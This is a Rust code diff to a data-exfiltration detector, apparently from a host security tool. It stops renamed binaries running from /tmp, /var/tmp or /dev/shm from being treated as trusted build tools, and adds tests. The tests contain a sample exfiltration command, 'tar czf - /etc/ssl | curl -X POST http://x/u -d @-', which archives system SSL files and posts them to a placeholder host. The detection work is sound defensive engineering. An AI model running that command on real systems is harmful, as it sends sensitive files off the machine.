@@ -126,6 +126,17 @@ impl DataExfiltrationDetector {
         false
     }
 
+    /// Untrusted staging directories. A binary executing from here is malware
+    /// staging, never a real system/package toolchain — so a build-tool *name*
+    /// (forgeable via argv0 / prctl) backed by a staging exe path must NOT be
+    /// treated as benign. Spec 072 Part D-sensor: the exe path is captured at
+    /// execve by the kernel and is non-forgeable (unlike `comm`).
+    fn exe_path_in_untrusted_staging(exe_path: &str) -> bool {
+        exe_path.starts_with("/tmp/")
+            || exe_path.starts_with("/var/tmp/")
+            || exe_path.starts_with("/dev/shm/")
+    }
+
     /// Check if a command references sensitive files.
     fn command_references_sensitive(command: &str) -> bool {
         for path in SENSITIVE_PATHS {
@@ -246,6 +257,13 @@ impl DataExfiltrationDetector {
                     .as_str()
                     .unwrap_or("unknown")
                     .to_string();
+                // Non-forgeable binary path captured at execve (spec 072 Part
+                // D-sensor). When present, a build-tool comm is only honoured if
+                // its exe is NOT in an untrusted staging dir — so a `/tmp/cargo`
+                // rename cannot launder exfil through the build-tool skip below.
+                // Absent (rare /proc race) → fall back to the comm-only skip.
+                let exe_path = event.details["exe_path"].as_str();
+                let exe_in_staging = exe_path.is_some_and(Self::exe_path_in_untrusted_staging);
 
                 // Skip build tools and package managers — their argv contains
                 // many system paths that false-positive as exfiltration patterns.
@@ -284,7 +302,7 @@ impl DataExfiltrationDetector {
                     "node",
                 ];
                 let comm_base = comm.split('/').next_back().unwrap_or(&comm);
-                if build_tools.iter().any(|t| comm_base.starts_with(t)) {
+                if !exe_in_staging && build_tools.iter().any(|t| comm_base.starts_with(t)) {
                     return None;
                 }
 
@@ -295,12 +313,15 @@ impl DataExfiltrationDetector {
                     .next()
                     .and_then(|w| w.rsplit('/').next())
                     .unwrap_or("");
-                if build_tools.iter().any(|t| cmd_first_word.starts_with(t)) {
+                if !exe_in_staging && build_tools.iter().any(|t| cmd_first_word.starts_with(t)) {
                     return None;
                 }
 
                 // Skip shell wrappers around build commands (bash -c "cd ... && cargo build ...")
-                if (comm_base == "bash" || comm_base == "sh") && command.len() > 100 {
+                if !exe_in_staging
+                    && (comm_base == "bash" || comm_base == "sh")
+                    && command.len() > 100
+                {
                     let lower_cmd = command.to_lowercase();
                     if lower_cmd.contains("cargo build")
                         || lower_cmd.contains("cargo test")
@@ -351,6 +372,10 @@ impl DataExfiltrationDetector {
                         "comm": comm,
                         "pid": pid,
                         "uid": uid,
+                        // Spec 072 Part D-sensor: non-forgeable exe path + whether
+                        // it ran from an untrusted staging dir (audit + gate input).
+                        "exe_path": exe_path,
+                        "exe_untrusted_staging": exe_in_staging,
                     }]),
                     recommended_checks: vec![
                         format!("Investigate process {comm} (pid={pid}) - who started it?"),
@@ -456,6 +481,20 @@ mod tests {
             tags: vec!["ebpf".to_string()],
             entities: vec![],
         }
+    }
+
+    /// Like `command_event` but with the kernel-captured `exe_path` set
+    /// (spec 072 Part D-sensor).
+    fn command_event_exe(
+        command: &str,
+        comm: &str,
+        exe_path: &str,
+        pid: u32,
+        ts: DateTime<Utc>,
+    ) -> Event {
+        let mut ev = command_event(command, comm, pid, ts);
+        ev.details["exe_path"] = serde_json::Value::String(exe_path.to_string());
+        ev
     }
 
     #[test]
@@ -720,6 +759,74 @@ mod tests {
                 now,
             ))
             .is_some());
+    }
+
+    // Spec 072 Part D-sensor: the build-tool skip is gated on the NON-forgeable
+    // exe path. A renamed payload in a staging dir cannot launder exfil through it.
+    #[test]
+    fn command_exec_fires_when_build_tool_name_runs_from_staging_dir() {
+        // comm spoofed to `cargo` but the real binary is /tmp/cargo → must FIRE.
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        let inc = det.process(&command_event_exe(
+            "tar czf - /etc/ssl | curl -X POST http://x/u -d @-",
+            "cargo",
+            "/tmp/cargo",
+            2001,
+            now,
+        ));
+        assert!(
+            inc.is_some(),
+            "a build-tool name backed by a /tmp exe is a spoof, not a build — must fire"
+        );
+    }
+
+    #[test]
+    fn command_exec_skips_build_tool_from_trusted_exe_path() {
+        // Same comm, but the real binary is a system path → benign build → skip.
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        let inc = det.process(&command_event_exe(
+            "tar czf - /etc/ssl | curl -X POST http://x/u -d @-",
+            "cargo",
+            "/usr/bin/cargo",
+            2002,
+            now,
+        ));
+        assert!(inc.is_none(), "a real toolchain binary is suppressed");
+    }
+
+    #[test]
+    fn command_exec_falls_back_to_comm_skip_when_no_exe_path() {
+        // No exe_path captured (race) → preserve the comm-only skip (#970).
+        let mut det = DataExfiltrationDetector::new("test", 60, 300);
+        let now = Utc::now();
+        let inc = det.process(&command_event(
+            "tar czf - /etc/ssl | curl -X POST http://x/u -d @-",
+            "cargo",
+            2003,
+            now,
+        ));
+        assert!(inc.is_none(), "no exe_path → comm-only skip still applies");
+    }
+
+    #[test]
+    fn exe_path_in_untrusted_staging_classifies_dirs() {
+        assert!(DataExfiltrationDetector::exe_path_in_untrusted_staging(
+            "/tmp/x"
+        ));
+        assert!(DataExfiltrationDetector::exe_path_in_untrusted_staging(
+            "/var/tmp/x"
+        ));
+        assert!(DataExfiltrationDetector::exe_path_in_untrusted_staging(
+            "/dev/shm/x"
+        ));
+        assert!(!DataExfiltrationDetector::exe_path_in_untrusted_staging(
+            "/usr/bin/cargo"
+        ));
+        assert!(!DataExfiltrationDetector::exe_path_in_untrusted_staging(
+            "/home/u/.cargo/bin/cargo"
+        ));
     }
 
     #[test]
